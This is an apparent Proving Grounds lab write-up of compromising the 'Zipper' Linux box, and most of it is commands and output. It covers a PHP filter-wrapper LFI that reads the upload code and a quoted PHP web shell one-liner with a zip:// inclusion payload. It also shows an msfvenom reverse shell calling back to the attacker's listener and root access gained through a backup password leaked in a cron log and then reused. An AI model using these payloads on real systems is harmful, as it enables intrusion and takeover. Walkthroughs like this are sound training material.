---
machine: Zipper
platform: Proving Grounds
category: Linux
difficulty: Insane
tags: [lfi, php-wrapper, zip-archive-rce, cron-privesc, zip-password-cracking, credential-reuse]
date: 2026-09-14
status: retired
summary: A Linux box running a file-zipping web app — testing a PHP filter-wrapper LFI to read source code, a `zip://` PHP-wrapper technique to execute an uploaded archive as code for a foothold, and a root-owned backup cron job whose password-protected archive leaks the root password for the path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/zipper]
└─$ nmap-full 192.168.131.229
[*] Running fast port discovery on 192.168.131.229...
[sudo] password for kali: 
[*] Open ports: 22,80
[*] Running full scan on 192.168.131.229...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-14 12:19 -0400
Nmap scan report for 192.168.131.229
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Zipper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.54 seconds
[*] Checking if UDP/SNMP is up on 192.168.131.229...
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.131.229:161 using SNMPv1 and community 'public'

[!] 192.168.131.229:161 SNMP request timeout

```

Feroxbust:

```bash
feroxbuster -u http://zipper -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --thorough

403      GET        9l       28w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      268c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      302c http://zipper/uploads => http://zipper/uploads/
200      GET        8l       26w      155c http://zipper/style
200      GET       76l      225w     3151c http://zipper/
301      GET        9l       28w      302c http://zipper/uploads => http://zipper/uploads/
404      GET        0l        0w      268c http://zipper/quiz
404      GET        0l        0w      268c http://zipper/uploads/set

```

Vhost fuzzing showed nothing: `ffuf -u http://zipper -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.zipper" -ac`

The webapp takes us to a homepage that allows us to upload files which will purportedly be compressed and zipped

After alot of trial and error tinkering with the file upload mechanic and trying to find LFI in the ?file= parameter in the url, we manage to successfully find that we can read `/upload` using a php read wrapper:

```text
http://zipper/index.php?file=php://filter/read=convert.base64-encode/resource=upload

PD9waHAKaWYgKCRfRklMRVMgJiYgJF9GSUxFU1snaW1nJ10pIHsKICAgIAogICAgaWYgKCFlbXB0eSgkX0ZJTEVTWydpbWcnXVsnbmFtZSddWzBdKSkgewogICAgICAgIAogICAgICAgICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOwogICAgICAgICR6aXBfbmFtZSA9IGdldGN3ZCgpIC4gIi91cGxvYWRzL3VwbG9hZF8iIC4gdGltZSgpIC4gIi56aXAiOwogICAgICAgIAogICAgICAgIC8vIENyZWF0ZSBhIHppcCB0YXJnZXQKICAgICAgICBpZiAoJHppcC0+b3BlbigkemlwX25hbWUsIFppcEFyY2hpdmU6OkNSRUFURSkgIT09IFRSVUUpIHsKICAgICAgICAgICAgJGVycm9yIC49ICJTb3JyeSBaSVAgY3JlYXRpb24gaXMgbm90IHdvcmtpbmcgY3VycmVudGx5Ljxici8+IjsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGltYWdlQ291bnQgPSBjb3VudCgkX0ZJTEVTWydpbWcnXVsnbmFtZSddKTsKICAgICAgICBmb3IoJGk9MDskaTwkaW1hZ2VDb3VudDskaSsrKSB7CiAgICAgICAgCiAgICAgICAgICAgIGlmICgkX0ZJTEVTWydpbWcnXVsndG1wX25hbWUnXVskaV0gPT0gJycpIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRuZXduYW1lID0gZGF0ZSgnWW1kSGlzJywgdGltZSgpKSAuIG10X3JhbmQoKSAuICcudG1wJzsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIE1vdmluZyBmaWxlcyB0byB6aXAuCiAgICAgICAgICAgICR6aXAtPmFkZEZyb21TdHJpbmcoJF9GSUxFU1snaW1nJ11bJ25hbWUnXVskaV0sIGZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbJ2ltZyddWyd0bXBfbmFtZSddWyRpXSkpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gbW92aW5nIGZpbGVzIHRvIHRoZSB0YXJnZXQgZm9sZGVyLgogICAgICAgICAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snaW1nJ11bJ3RtcF9uYW1lJ11bJGldLCAnLi91cGxvYWRzLycgLiAkbmV3bmFtZSk7CiAgICAgICAgfQogICAgICAgICR6aXAtPmNsb3NlKCk7CiAgICAgICAgCiAgICAgICAgLy8gQ3JlYXRlIEhUTUwgTGluayBvcHRpb24gdG8gZG93bmxvYWQgemlwCiAgICAgICAgJHN1Y2Nlc3MgPSBiYXNlbmFtZSgkemlwX25hbWUpOwogICAgfSBlbHNlIHsKICAgICAgICAkZXJyb3IgPSAnPHN0cm9uZz5FcnJvciEhIDwvc3Ryb25nPiBQbGVhc2Ugc2VsZWN0IGEgZmlsZS4nOwogICAgfQp9Cg==
```

After base64 decoding this we find the code to be:

```php
<?php
if ($_FILES && $_FILES['img']) {
    
    if (!empty($_FILES['img']['name'][0])) {
        
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
        
        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }
        
        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {
        
            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';
            
            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
            
            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();
        
        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}

```

## Foothold

We see that our files are zipped and stored in the relative uploads directory under a new generated name. I found that for servers which zip is enabled, there is actually a php wrapper function that allows you to unzip and reference the file in the url: https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a

The example given is:

```text
<pre><?php system($_GET['cmd']); ?></pre>
zip shell.zip shell.php
http://target.com/index.php??page=zip://shell.zip%23shell.php&cmd=ls
```

So we can upload a php reverse shell and then call the zip:// wrapper, the uploads directory, name of our generated zip file, `%23` url encoding, and the name of our php reverse shell to interpret its contents in php.

Upon uploading our php reverse shell, we see our url is `http://zipper/index.php/uploads/uploads/upload_1789406078.zip` indicating that our zipped php reverse shell is named `upload_1789406078.zip`.

I used msfvenom to generate a php reverse shell named `shell2.php`, uploaded it and ran the following, ensure not to append the `.php` extension to your pre-zip file name:

```bash
http://zipper/index.php?file=zip://uploads/upload_1789406078.zip%23shell2

┌──(kali㉿kali)-[~/oscp/zipper]
└─$ rlwrap -cAr nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.155] from (UNKNOWN) [192.168.131.229] 42022

whoami
www-data
```

We can navigate to the `/var/www` directory to find our `local.txt` flag:

```bash
cd /var/www
ls
html
local.txt
```

## Privilege Escalation

Upon running `linpeas.sh`, we find an interesting cronjob being run by root:

```bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/backup.sh
/etc/crontab:8:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/popularity-contest:2:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/crontab:18:17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
/etc/crontab:19:25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
/etc/crontab:20:47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
/etc/crontab:21:52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

```bash
* *     * * *   root    bash /opt/backup.sh
```

This means root executes `/opt/backup.sh` with bash every minute. We can run pspy64 to see if we can get any extra information about this cronjob:

```bash
2026/09/14 17:37:01 CMD: UID=0     PID=242520 | cat /root/secret 
2026/09/14 17:37:01 CMD: UID=0     PID=242519 | bash /opt/backup.sh 
2026/09/14 17:37:01 CMD: UID=0     PID=242518 | /bin/sh -c    bash /opt/backup.sh 
2026/09/14 17:37:01 CMD: UID=0     PID=242517 | /usr/sbin/CRON -f 
2026/09/14 17:37:01 CMD: UID=0     PID=242522 | /usr/lib/p7zip/7za a /opt/backups/backup.zip -p****************** -tzip @enox.zip enox.zip upload_1628773085.zip upload_1789405952.zip upload_1789406078.zip   
```

```bash
ls -lah /opt/backup.sh

-rwxr-xr-x 1 root root 153 Aug 12  2021 /opt/backup.sh

cat /opt/backup.sh

#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

We can go investigate `/opt/backups`, there is a chance the `backup.log` file leaks the password for the directory or we can use `zip2john` to bruteforce the .zip password with `rockyou.txt`.

```bash
cat /opt/backups/backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7371 16-Core Processor                 (800F12),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 1976

Scanning the drive:
4 files, 1391 bytes (2 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 4


Files read from disk: 4
Archive size: 1976 bytes (2 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
----------------
Scan WARNINGS: 1
```

We can attempt to use this phrase to extract the contents of the `backup.zip` folder that is in `/opt/backups`:

```bash
┌──(kali㉿kali)-[~/oscp/zipper]
└─$ unzip -P WildCardsGoingWild backup.zip 
Archive:  backup.zip
 extracting: enox.zip                
  inflating: upload_1628773085.zip   
  inflating: upload_1789405952.zip   
 extracting: upload_1789406078.zip 
```

Its successful! This means that `WildCardsGoingWild` was the password used by root to encrypt the zip folder in the `backup.sh` script. We next attempt cred reuse with this password and find that we can `su root` successfully and retrieve the proof.txt:

```bash
┌──(kali㉿kali)-[~/oscp/zipper]
└─$ rlwrap -cAr nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.155] from (UNKNOWN) [192.168.131.229] 40702
su root
Password: WildCardsGoingWild
whoami
root

ls -lah
total 36K
drwx------  5 root root 4.0K Sep 14 17:11 .
drwxr-xr-x 20 root root 4.0K Aug 12  2021 ..
lrwxrwxrwx  1 root root    9 Aug 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4.0K Jan  7  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rwx------  1 root root   33 Sep 14 17:11 proof.txt
-rwx------  1 root root   19 Aug 12  2021 secret
drwxr-xr-x  3 root root 4.0K Jan  7  2021 snap
drwx------  2 root root 4.0K Jan  7  2021 .ssh
```

Box is owned.
